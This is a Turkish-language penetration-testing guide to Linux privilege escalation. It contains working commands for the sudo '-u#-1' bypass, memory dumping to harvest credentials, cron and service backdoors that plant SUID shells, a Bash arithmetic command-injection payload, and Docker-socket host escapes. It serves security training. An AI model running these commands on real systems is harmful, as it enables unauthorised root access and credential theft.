# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgileri

### OS bilgisi

Çalışan OS hakkında bazı bilgiler edinmeye başlayalım.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### PATH

Eğer **`PATH` değişkenindeki herhangi bir klasörde yazma izniniz** varsa bazı kütüphaneleri veya binaries dosyalarını ele geçirebilirsiniz:
```bash
echo $PATH
```
### Env info

İlginç bilgiler, şifreler veya API anahtarları environment variables içinde mi?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Çekirdek sürümünü kontrol edin ve ayrıcalıkları yükseltmek için kullanılabilecek bir exploit olup olmadığını araştırın.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Burada güvenlik açığı bulunan iyi bir kernel listesi ve bazı hazır **compiled exploits** bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Bazı **compiled exploits** bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Bu siteden tüm güvenlik açığı bulunan kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits aramak için yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, sadece kernel 2.x için exploits'leri kontrol eder)

Her zaman **kernel version'ı Google'da arayın**, belki kernel version'unuz bazı kernel exploit'lerinde yazılıdır ve böylece bu exploit'in geçerli olduğundan emin olursunuz.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Aşağıda görünen zafiyetli sudo sürümlerine dayanarak:
```bash
searchsploit sudo
```
sudo sürümünün zafiyete sahip olup olmadığını bu grep ile kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Kaynak: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız

Bu vuln'ün nasıl istismar edilebileceğine dair bir **örnek** için **smasher2 box of HTB**'yi kontrol edin.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem keşfi
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları listele

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Eğer bir docker container içindeyseniz ondan kaçmayı deneyebilirsiniz:


{{#ref}}
docker-security/
{{#endref}}

## Sürücüler

Nelerin **mounted and unmounted** olduğunu, nerede ve neden olduğunu kontrol edin. Eğer herhangi bir şey unmounted ise onu mount etmeyi ve özel bilgileri kontrol etmeyi deneyebilirsiniz
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Kullanışlı yazılımlar

Kullanışlı binaries'leri listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir derleyicinin yüklü olup olmadığını** kontrol edin. Bu, kernel exploit kullanmanız gerekirse faydalıdır; çünkü exploit'i kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Açıkları Olan Yüklü Yazılımlar

Yüklü paketlerin ve servislerin **sürümlerini** kontrol edin. Belki örneğin, escalating privileges için sömürülebilecek eski bir Nagios sürümü olabilir…\
Daha şüpheli görünen yüklü yazılımların sürümlerini manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Makineye SSH erişiminiz varsa, makineye yüklü, güncel olmayan ve güvenlik açığı bulunan yazılımları kontrol etmek için **openVAS**'ı da kullanabilirsiniz.

> [!NOTE] > _Bu komutların çoğunlukla işe yaramaz çok fazla bilgi göstereceğini unutmayın, bu nedenle yüklü herhangi bir yazılım sürümünün bilinen exploits'lere karşı zafiyetli olup olmadığını kontrol eden OpenVAS veya benzeri uygulamalar tavsiye edilir_

## Processes

Çalıştırılan **hangi işlemlerin** olduğunu inceleyin ve herhangi bir işlemin olması gerekenden **daha fazla ayrıcalığa sahip olup olmadığını** kontrol edin (örneğin tomcat'in root tarafından çalıştırılıyor olması?).
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Ayrıca **processes binaries üzerindeki ayrıcalıklarınızı kontrol edin**, belki birini overwrite edebilirsiniz.

### İşlem izleme

İşlemleri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçlar kullanabilirsiniz. Bu, sık çalıştırılan veya belirli gereksinimler karşılandığında yürütülen kırılgan işlemleri tespit etmek için çok faydalı olabilir.

### İşlem belleği

Bir sunucunun bazı servisleri **kimlik bilgilerini bellek içinde düz metin olarak** saklayabilir.\
Normalde diğer kullanıcılara ait işlemlerin belleğini okumak için **root privileges** gerekir; bu nedenle bu genellikle zaten root olduğunuzda ve daha fazla kimlik bilgisi keşfetmek istediğinizde daha faydalıdır.\
Ancak, unutmayın ki **normal bir kullanıcı olarak sahip olduğunuz işlemlerin belleğini okuyabilirsiniz**.

> [!WARNING]
> Günümüzde çoğu makine varsayılan olarak **ptrace'e izin vermez**, bu da ayrıcalıksız kullanıcınıza ait diğer işlemleri dump edemeyeceğiniz anlamına gelir.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: same uid'ye sahip oldukları sürece tüm işlemler debug edilebilir. Bu, ptracing'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: yalnızca bir parent process debug edilebilir.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir işlem ptrace ile izlenemez. Bir kez ayarlandıktan sonra ptrace'i tekrar etkinleştirmek için reboot gerekir.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Betiği
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir süreç kimliği için, **maps belleğin o sürecin sanal adres alanında nasıl eşlendiğini gösterir**; ayrıca **her eşlenmiş bölgenin izinlerini** gösterir. Bu **mem** pseudo dosyası **sürecin belleğini bizzat açığa çıkarır**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve ofsetlerini biliriz. Bu bilgiyi kullanarak **mem dosyasında konuma atlayıp tüm okunabilir bölgeleri** bir dosyaya dökeriz.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. Çekirdeğin sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grubuna üye kullanıcılar tarafından okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump için linux

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının Linux için yeniden yorumlanmış halidir. Edinin [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir process memory'yi dump etmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Root gereksinimlerini elle kaldırabilir ve size ait process'i dump edebilirsiniz
- Script A.5 [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) adresinden (root gereklidir)

### Process Memory'den Kimlik Bilgileri

#### Manuel örnek

authenticator process'in çalıştığını görürseniz:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Process'i dump edebilirsiniz (önceki bölümlere bakın; bir process'in memory'sini dump etmenin farklı yollarını bulabilirsiniz) ve memory içinde credentials arayın:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **bellekten açık metin kimlik bilgilerini** ve bazı **iyi bilinen dosyalardan** çalacaktır. Doğru çalışması için root ayrıcalıkları gerektirir.

| Özellik                                           | İşlem Adı            |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Arama Regexleri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron görevleri

Herhangi bir zamanlanmış görevin güvenlik açığına sahip olup olmadığını kontrol et. Belki root tarafından çalıştırılan bir script'ten faydalanabilirsin (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misin? symlinks kullanmak? root'un kullandığı dizinde belirli dosyalar oluşturmak?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron yolu

Örneğin, _/etc/crontab_ içinde PATH'i bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Dikkat edin: kullanıcı "user" /home/user üzerinde yazma yetkisine sahip_)

Eğer bu crontab içinde root kullanıcısı PATH'i ayarlamadan bir komut veya script çalıştırmaya çalışıyorsa. Örneğin: _\* \* \* \* root overwrite.sh_\
Böylece şu komutu kullanarak root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron wildcard içeren bir script kullanımı (Wildcard Injection)

Eğer root tarafından çalıştırılan bir script'te bir komut içinde “**\***” varsa, bunu beklenmeyen şeyler (ör. privesc) yapmak için kötüye kullanabilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer wildcard şu gibi bir yolun öncesindeyse** _**/some/path/\***_ **, zayıf değildir (hatta** _**./\***_ **de değildir).**

Daha fazla wildcard exploitation tricks için aşağıdaki sayfayı okuyun:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash, ((...)), $((...)) ve let içindeki arithmetic evaluation'dan önce parameter expansion ve command substitution uygular. Eğer bir root cron/parser güvenilmeyen log alanlarını okuyup bunları arithmetic context'e veriyorsa, bir saldırgan $(...) şeklinde bir command substitution enjekte edebilir ve cron çalıştığında bu root olarak çalıştırılır.

- Neden işe yarar: Bash'te expansions şu sırayla gerçekleşir: parameter/variable expansion, command substitution, arithmetic expansion, ardından word splitting ve pathname expansion. Bu yüzden `$(/bin/bash -c 'id > /tmp/pwn')0` gibi bir değer önce substitute edilir (komut çalıştırılır), sonra kalan sayısal `0` arithmetic için kullanılır ve script hatasız devam eder.

- Tipik vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Parsed edilen log'a saldırgan kontrollü metin yazdırın, böylece sayısal görünen alan bir command substitution içerir ve bir rakamla biter. Komutunuz stdout'a yazdırmasın (veya yönlendirin) ki arithmetic geçerli kalsın.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Eğer root tarafından çalıştırılan bir **cron script'ini değiştirebiliyorsanız**, çok kolay bir shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından çalıştırılan script **tam erişiminiz olan bir dizin** kullanıyorsa, o klasörü silip **başka bir dizine symlink oluşturmak** ve sizin kontrolünüzdeki script'i barındıran bir dizine yönlendirmek faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Sık cron görevleri

1, 2 veya 5 dakikada bir çalışan süreçleri tespit etmek için süreçleri izleyebilirsiniz. Belki bundan faydalanarak yetki yükseltme yapabilirsiniz.

Örneğin, **1 dakika boyunca her 0.1s'de izlemek**, **en az çalıştırılan komutlara göre sıralamak** ve en çok çalıştırılan komutları silmek için şu komutu kullanabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu başlayan her işlemi izleyecek ve listeleyecektir).

### Görünmez cron jobs

Bir cronjob, **yorumdan sonra carriage return koyarak** (newline karakteri olmadan) oluşturulabilir ve cron job çalışacaktır. Örnek (carriage return karakterine dikkat):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasına yazıp yazamayacağınızı kontrol edin; yazabiliyorsanız, onu **değiştirebilir** ve hizmet **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** arka kapınızı **çalıştırmasını** sağlayabilirsiniz (belki makinenin yeniden başlatılmasını beklemeniz gerekebilir).\
Örneğin arka kapınızı .service dosyasının içine **`ExecStart=/tmp/script.sh`** ile oluşturun.

### Yazılabilir servis ikili dosyaları

Unutmayın ki eğer **servisler tarafından çalıştırılan ikili dosyalar üzerinde yazma izinleriniz** varsa, bunları arka kapılarla değiştirebilirsiniz; böylece servisler yeniden çalıştırıldığında arka kapılar da çalıştırılacaktır.

### systemd PATH - Göreceli Yollar

**systemd** tarafından kullanılan PATH'i şu komutla görebilirsiniz:
```bash
systemctl show-environment
```
Eğer yolun klasörlerinden herhangi birine **yazabiliyorsanız**, muhtemelen **escalate privileges** yapabilirsiniz. Servis yapılandırma dosyalarında kullanılan **göreli yollar** gibi öğeleri aramanız gerekir:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Sonra, yazma hakkınız olan systemd PATH klasörünün içine, **göreli yol üzerindeki binary ile aynı ada sahip bir yürütülebilir dosya** oluşturun ve hizmetten savunmasız eylemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde, sizin **backdoor** çalıştırılacaktır (ayrıcalıksız kullanıcılar genellikle hizmetleri başlatıp durduramazlar ama `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

**Hizmetler hakkında daha fazla bilgi için `man systemd.service` kullanın.**

## **Zamanlayıcılar**

**Zamanlayıcılar** (Timers), adı `**.timer**` ile biten ve `**.service**` dosyalarını veya olaylarını kontrol eden systemd unit dosyalarıdır. **Zamanlayıcılar**, takvim zaman olayları ve monotonik zaman olayları için yerleşik destek sağladıkları ve eşzamansız olarak çalıştırılabildikleri için cron'a bir alternatif olarak kullanılabilir.

Tüm zamanlayıcıları şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir zamanlayıcılar

Bir timer'ı değiştirebilirseniz, systemd.unit içindeki bazı mevcut birimleri (ör. `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.
```bash
Unit=backdoor.service
```
Dokümantasyonda Unit'in ne olduğu şöyle açıklanıyor:

> Zamanlayıcı sona erdiğinde etkinleştirilecek unit. Argüman, son eki ".timer" olmayan bir unit adıdır. Belirtilmemişse, bu değer varsayılan olarak timer unit ile aynı ada sahip, yalnızca son eki farklı olan bir service olarak kabul edilir. (Yukarıya bakınız.) Etkinleştirilen unit adı ile timer unit adı, son ek dışında aynı adlandırılması önerilir.

Bu izni kötüye kullanmak için şunlara ihtiyacınız olur:

- Yazılabilir bir ikiliyi **çalıştıran** bir systemd unit (ör. `.service`) bulun
- Bir göreli yol ile **çalıştırılan** ve **systemd PATH** üzerinde **yazma ayrıcalığınız** olan bir systemd unit bulun (o yürütülebilir dosyayı taklit etmek için)

**Zamanlayıcılar hakkında daha fazlasını `man systemd.timer` ile öğrenin.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **işlem iletişimi** aynı veya farklı makinelerde istemci-sunucu modelleri içinde. Bilgisayarlar arası iletişim için standart Unix descriptor dosyalarını kullanırlar ve `.socket` dosyalarıyla yapılandırılırlar.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır ancak bir özet, soketin **nerede dinleyeceğini belirtmek** için kullanılır (AF_UNIX socket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası vb.)
- `Accept`: boolean bir argüman alır. Eğer **true** ise, **her gelen bağlantı için bir servis örneği başlatılır** ve yalnızca bağlantı soketi ona iletilir. Eğer **false** ise, tüm dinleme soketleri **başlatılan servis birimine geçirilir**, ve tüm bağlantılar için yalnızca bir servis birimi başlatılır. Bu değer, tek bir servis biriminin koşulsuz şekilde tüm gelen trafiği yönettiği datagram soketleri ve FIFO'lar için göz ardı edilir. **Varsayılan false'tur**. Performans nedenleriyle, yeni daemon'ların yalnızca `Accept=no` ile uyumlu olacak şekilde yazılması önerilir.
- `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır; bunlar sırasıyla dinlenen **sockets**/FIFO'lar **oluşturulmadan** ve bağlanmadan **önce** veya **sonra** **çalıştırılır**. Komut satırının ilk öğesi mutlak bir dosya adı olmalı, ardından işlem için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Dinlenen **sockets**/FIFO'lar **kapatılmadan** ve kaldırılmadan **önce** veya **sonra** **çalıştırılan** ek **komutlar**dır.
- `Service`: Gelen trafik üzerine **aktive edilecek** **service** unit adını belirtir. Bu ayar sadece Accept=no olan soketler için izinlidir. Varsayılan olarak, soketle aynı ada sahip (son eki değiştirilmiş) servis kullanılır. Çoğu durumda bu seçeneği kullanmaya gerek yoktur.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Not that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Dikkat: bazı **sockets listening for HTTP** requests olabilir (_Ben .socket dosyalarından değil, unix sockets olarak davranan dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Eğer socket **HTTP ile cevap veriyorsa**, onunla **iletişim kurabilir** ve belki de bazı **zafiyetleri istismar edebilirsiniz**.

### Yazılabilir Docker Socket

Docker socket, genellikle `/var/run/docker.sock` konumunda bulunur ve korunması gereken kritik bir dosyadır. Varsayılan olarak, `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir. Bu socket'e yazma erişimine sahip olmak privilege escalation'a yol açabilir. Aşağıda bunun nasıl yapılabileceğinin ve Docker CLI mevcut değilse alternatif yöntemlerin bir dökümü bulunmaktadır.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, host'un dosya sistemine root düzeyinde erişimi olan bir container çalıştırmanıza izin verir.

#### **Docker API'sini Doğrudan Kullanma**

Docker CLI mevcut değilse, Docker socket yine Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **List Docker Images:** Mevcut image'lerin listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Ana sistemin kök dizinini mount eden bir container oluşturmak için istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan container'ı başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` kullanarak container ile bağlantı kurun; bu, içinde komut çalıştırmanıza olanak sağlar.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` bağlantısını kurduktan sonra, host'un dosya sistemine root erişimiyle doğrudan container içinde komut çalıştırabilirsiniz.

### Diğerleri

Eğer docker socket üzerinde yazma izinleriniz varsa çünkü **`docker` grubunun içindeyseniz**, [**daha fazla ayrıcalık yükseltme yolu**](interesting-groups-linux-pe/index.html#docker-group) vardır. Eğer [**docker API bir portta dinliyorsa** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

docker'dan çıkmanın veya onu kötüye kullanarak ayrıcalıkları yükseltmenin **daha fazla yolunu** inceleyin:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Eğer **`ctr`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü onu ayrıcalıkları yükseltmek için kötüye kullanabiliyor olabilirsiniz:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Eğer **`runc`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü onu ayrıcalıkları yükseltmek için kötüye kullanabiliyor olabilirsiniz:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli şekilde etkileşimde bulunup veri paylaşmasına olanak veren gelişmiş bir inter-Process Communication (IPC) sistemidir. Modern Linux sistemi gözetilerek tasarlanmış olup, uygulamalar arası farklı iletişim biçimleri için sağlam bir çerçeve sunar.

Sistem çok yönlüdür; temel IPC'yi destekleyerek süreçler arası veri alışverişini geliştirir ve gelişmiş UNIX domain sockets'ı anımsatan işlevsellik sağlar. Ayrıca olay veya sinyal yayınlamaya yardımcı olarak sistem bileşenleri arasında sorunsuz entegrasyonu teşvik eder. Örneğin, bir Bluetooth daemon'undan gelen gelen arama sinyali, bir müzik çalarını sesini kısmaya yönlendirebilir. D-Bus ayrıca uzak nesne (remote object) sistemini destekler; bu, servis taleplerini ve method çağırımlarını uygulamalar arasında basitleştirir ve geleneksel olarak karmaşık olan süreçleri düzene sokar.

D-Bus, allow/deny modeline göre çalışır; eşleşen politika kurallarının kümülatif etkisine dayanarak mesaj izinlerini (method çağrıları, sinyal yayınları vb.) yönetir. Bu politikalar bus ile etkileşimleri belirler ve bu izinlerin suiistimali yoluyla privilege escalation'a olanak tanıyabilir.

